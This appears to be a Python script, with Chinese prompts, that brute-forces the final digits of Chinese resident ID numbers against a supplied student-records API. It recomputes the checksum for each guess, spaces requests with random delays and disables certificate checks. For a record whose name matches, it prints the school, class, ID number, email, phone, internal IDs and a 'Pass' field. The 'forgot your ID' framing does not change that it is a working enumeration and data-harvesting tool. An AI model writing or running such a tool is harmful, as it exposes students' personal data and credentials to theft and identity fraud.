import requests
import logging
import random
import time
def mod(dividend, divisor):
    return dividend % divisor
def CN_ID_Compute(ID_1_17):
    i = 17
    S = 0
    while i > 0:
        S = int(S) + int(int(ID_1_17[i - 1]) * int(WI[i - 1]))
        i -= 1
    result_mid = mod(dividend=S, divisor=11)
    i = 10
    while i >= 0:
        if int(Y[i]) == int(result_mid):
            return YX[i]
        i -= 1
def Last_4_ID_Try(BeTry,Sex,NAME,API,TME):
    time.sleep(0.2)
    print("Checking...")
    time.sleep(0.2)
    Try_CNID = list(BeTry)
    NAME_list = list(NAME)
    if Sex == 0:
        i = ["0", "0", "0"] # U
        times = 999
        PerPlus = 1
    elif Sex == 1:
        i = ["0", "0", "0"] # W
        times = 499
        PerPlus = 2
    elif Sex == 2:
        i = ["0", "0", "1"] # M
        times = 499
        PerPlus = 2
    else : return 0
    time_mid = times
    wait_predict_s = times * TME
    wait_predict_m = str(int(wait_predict_s/60))
    print("Need " + wait_predict_m +" min at least.")
    time.sleep(0.7)
    while times >= 0:
        print(str(100-(int((times/time_mid)*100))) + "%")
        time_sleep = random.uniform(TME-0.1,TME+0.1)
        time.sleep(time_sleep)
        Try_CNIDstr = "".join(Try_CNID)
        CNID = Try_CNIDstr
        logging.captureWarnings(True)
        response = requests.get(API + CNID,verify=False) # 发送请求
        if response.status_code == 200:
            #print(response.text)
            str_getres = str(response.text)
            position_beg_XXBMS = str_getres.find("\"XXBSM\"")
            position_beg_Class = str_getres.find("级",str_getres.find("\"BJMC\""))
            position_end_Class = str_getres.find("班",position_beg_Class)
            position_beg_XS_JBXX_ID = str_getres.find("\"XS_JBXX_ID\"")
            position_beg_Pass = str_getres.find("Pass")
            position_beg_school = str_getres.find("XXMC")
            position_end_school = str_getres.find("BJMC")
            position_beg_NAME = str_getres.find("XM",position_end_school)
            position_end_NAME = str_getres.find("SFZJH")
            position_beg_ID = position_end_NAME
            position_end_ID = str_getres.find("GRBSM")
            position_beg_email = str_getres.find("Email")
            position_end_email = str_getres.find("MobilePhoneNo")
            position_beg_phonenum = position_end_email + 16
            position_end_phonenum = str_getres.find("\"}")
            OBJ_XXBMS = str_getres[position_beg_XXBMS + 9:position_beg_school - 3]
            OBJ_CLASS = str_getres[position_beg_Class + 1:position_end_Class + 1]
            OBJ_XS_JBXX_ID = str_getres[position_beg_XS_JBXX_ID + len("\"XS_JBXX_ID\":\"") : position_beg_NAME - 3]
            OBJ_Pass = str_getres[position_beg_Pass + 7 : position_beg_email - 3]
            OBJ_school = str_getres[position_beg_school + 7:position_end_school - 3]
            OBJ_NAME = str_getres[position_beg_NAME + 5:position_end_NAME - 3]
            OBJ_ID = str_getres[position_beg_ID + 8:position_end_ID - 5]
            OBJ_email = str_getres[position_beg_email + 8:position_end_email - 3]
            OBJ_PHONEnum = str_getres[position_beg_phonenum:position_end_phonenum]
            OBJ_NAME_list = list(OBJ_NAME)
            namelength = len(NAME_list)
            mid_FUCK1 = namelength
            OBJ_namelength = len(OBJ_NAME_list)
            trustNUM = False
            similar_Num = 0
            while namelength > 0 and mid_FUCK1 == OBJ_namelength:
                if NAME_list[namelength-1] == OBJ_NAME_list[namelength-1] or OBJ_NAME_list[namelength - 1] == "*":
                    namelength -= 1
                    similar_Num += 1
                    trustNUM = True
                else:
                    trustNUM = False
                    break
            if trustNUM == True and similar_Num == mid_FUCK1:
                print("100%")
                print("***************INFO*********************")
                print("School:" + OBJ_school)
                print("Name:" + NAME)
                print("I D:" + OBJ_ID)
                print("e-mail:" + OBJ_email)
                print("phoneN:" + OBJ_PHONEnum)
                print("class:" + OBJ_CLASS)
                print("SFZJH:" + OBJ_ID + "\\t")
                print("XS_JBXX_ID:" + OBJ_XS_JBXX_ID)
                print("XXBMS:" + OBJ_XXBMS)
                print("Pass:" + OBJ_Pass)
                print("*******************************************")
                return True
        j = int(i[0]) * 100 + int(i[1]) * 10 + int(i[2])
        Try_CNID[14] = i[0]
        Try_CNID[15] = i[1]
        Try_CNID[16] = i[2]
        Try_CNID[17] = str(CN_ID_Compute(Try_CNID))
        j += PerPlus
        i[0] = str(int((j - (j % 100)) / 100))
        i[1] = str(int(((j % 100) - ((j % 100) % 10)) / 10))
        i[2] = str(int(j % 10))
        times -= 1
def input_imfo ():
    CINO_P1_City = "4405"  # City_NUM
    CINO_P2_District = "01"  # District_NUM
    CINO_P3_BirthYear = "2000"  # BirthYear_NUM
    CINO_P4_BirthMonth = "01"  # BirthMonth_NUM
    CINO_P5_BirthDay = "01"  # BirthDay_NUM
    CINO_P6_Serial = "01"  # Serial_NUM
    CINO_P7_Gender = "0"  # Gender_NUM
    CINO_P8_Check = "0"  # Check_NUM

    print("您的身份归属地:(NULL)")
    city_num = input("输入对应数字:")
    if city_num == "1":
        CINO_P2_District = "01"
    elif city_num == "2":
        CINO_P2_District = "07"
    elif city_num == "3":
        CINO_P2_District = "11"
    elif city_num == "4":
        CINO_P2_District = "12"
    elif city_num == "5":
        CINO_P2_District = "13"
    elif city_num == "6":
        CINO_P2_District = "14"
    elif city_num == "7":
        CINO_P2_District = "15"
    elif city_num == "8":
        CINO_P2_District = "23"
    else:
        print("ERROR")
        return False
    CINO_P3_BirthYear = input("输入出身年:")
    if int(CINO_P3_BirthYear) <= 2000 or int(CINO_P3_BirthYear) >= 2020:
        print("ERROR")
        return False
    CINO_P4_BirthMonth = input("输入出身月:")
    if int(CINO_P4_BirthMonth) <= 0 or int(CINO_P4_BirthMonth) > 12:
        print("ERROR")
        return False
    CINO_P5_BirthDay = input("输入出身日:")
    if int(CINO_P5_BirthDay) <= 0 or int(CINO_P5_BirthDay) > 31:
        print("ERROR")
        return False
    China_ID_NUM_OBJ = CINO_P1_City + CINO_P2_District + \
                       CINO_P3_BirthYear + CINO_P4_BirthMonth + \
                       CINO_P5_BirthDay + CINO_P6_Serial + \
                       CINO_P7_Gender + CINO_P8_Check
    return China_ID_NUM_OBJ
def input_sex():
    print("输入性别:(0.未知 1.女性 2.男性)")
    sex_num = input("输入对应数字:")
    if sex_num == "0" or sex_num == "1" or sex_num == "2":
        return sex_num
    else:
        return False
I = (18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1)
WI = (7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2, 1)
Y = (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10)
YX = (1, 0, "X", 9, 8, 7, 6, 5, 4, 3, 2)
def main():
    kami = input("ENTER PSW:")
    timesw = 0.5
    if kami == "0" or kami == "0":
        API_ = input("PSW RIGHT PLS ENTER API:")
        print("CN ID Check:(if u forget your ID)")
        time.sleep(0.2)
        Last_4_ID_Try(BeTry=input_imfo(), Sex=int(input_sex()), NAME=input("输入你的姓名:"),API=API_,TME=timesw)
        print("查询成功!程序将在30秒后自动关闭.")
        time.sleep(30)
        return 0
    else:
        print("PSW ERROR")
main()